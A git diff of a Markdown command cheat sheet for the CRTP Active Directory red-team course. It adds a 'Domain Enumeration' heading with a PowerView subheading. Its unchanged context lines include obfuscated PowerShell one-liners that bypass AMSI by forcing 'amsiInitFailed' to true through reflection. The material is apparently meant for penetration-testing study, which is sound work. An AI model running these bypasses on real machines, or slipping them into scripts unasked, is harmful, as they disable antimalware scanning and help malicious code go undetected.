@@ -5,7 +5,7 @@ Commands and reference material useful for the CRTP course and Active Directory.
   - [Shell Prep & Defense Evasion](#Shell-Prep-&-Defense-Evasion)  
     - [Invisi-Shell](#Invisi-Shell)
     - [AMSI Bypass](#AMSI-Bypass)
-
+- [Domain Enumeration](#Domain-Enumeration)  
 
 ## Shell Prep & Defense Evasion
 
@@ -33,3 +33,5 @@ sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE
 ```
 [Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True)
 ```
+## Domain Enumeration 
+#### Powerview 
